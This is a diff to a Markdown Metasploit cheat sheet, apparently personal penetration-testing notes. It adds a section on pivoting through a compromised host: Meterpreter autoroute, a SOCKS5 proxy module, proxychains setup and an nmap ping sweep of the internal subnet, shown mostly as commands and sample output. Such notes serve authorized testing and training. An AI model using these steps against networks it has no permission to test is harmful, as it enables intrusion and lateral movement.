@@ -46,6 +46,7 @@ Metasploit Framework
 			1. [Keylogging](#Keylogging)
 			2. [EventLogs](#EventLogs)
 			3. [Pivoting Windows](#Pivoting-Windows)
+4. [MSF Socks Proxy](#MSF-Socks-Proxy)
 
 
 
@@ -578,4 +579,71 @@ Use a machine that is connected to another network to pivot to it.
 	2. `set LPORT 4422` : unused port
 	3. `set RHOSTS <target2>` : target 2 ip
 
-### Linux
+
+# MSF-Socks-Proxy
+[MSF Documentation](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
+
+Here's a detailed walkthrough on how to set up `autoroute` in Metasploit, create a SOCKS5 proxy, and then use Nmap to perform a ping sweep (`-sn`) through the proxy using `proxychains`. This approach will allow you to scan a network that is accessible through a compromised machine.
+
+### Step-by-Step Guide
+
+#### 1. **Establish a Meterpreter Session**
+
+First, ensure you have an active Meterpreter session with a compromised host that has access to the target network.
+
+```shell
+msf6 > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                     Connection
+  --  ----  ----                   -----------                     ----------
+  1         meterpreter x64/linux  user@target                     192.168.1.2:4444 -> 10.10.10.2:1234
+```
+#### 2. **Set Up `autoroute`**
+
+Set up routing in the Meterpreter session to access the target network. In this example, let's say the target network is `192.168.1.0/24`.
+```shell
+meterpreter > run autoroute -s 192.168.1.0 -n 255.255.255.0
+```
+
+This command tells Meterpreter to route traffic destined for the `192.168.1.0/24` network through the compromised host.
+
+**Verify the Routes:**
+```shell
+meterpreter > run autoroute -p
+```
+
+You should see an output showing the route has been added:
+```shell
+[+] Active Routing Table
+Subnet             Netmask            Gateway
+------             -------            -------
+192.168.1.0        255.255.255.0      Session 1
+```
+
+#### 3. **Set Up a SOCKS5 Proxy in Metasploit**
+
+Now, set up a SOCKS5 proxy server using Metasploit, which will allow your local tools to route traffic through the session.
+```shell
+use auxiliary/server/socks_proxy set SRVHOST 127.0.0.1 set SRVPORT 1080 run
+```
+
+This starts a SOCKS5 proxy on your local machine at `127.0.0.1:1080`.
+
+#### 4. **Configure Proxychains on Your Local Machine**
+
+To route Nmap through the SOCKS proxy, you need to configure `proxychains`. Edit the `proxychains.conf` file, usually located at `/etc/proxychains.conf`, and add the following line at the end:
+```txt
+socks5 127.0.0.1 1080
+```
+
+This tells `proxychains` to use the SOCKS5 proxy you set up in Metasploit.
+
+#### 5. **Run Nmap Through Proxychains**
+
+Use `proxychains` to run Nmap and perform the ping sweep (`-sn`) on the target network. The `-sn` flag tells Nmap to perform a ping scan (host discovery only, no port scanning).
+```sh
+proxychains nmap -sn 192.168.1.0/24
+```
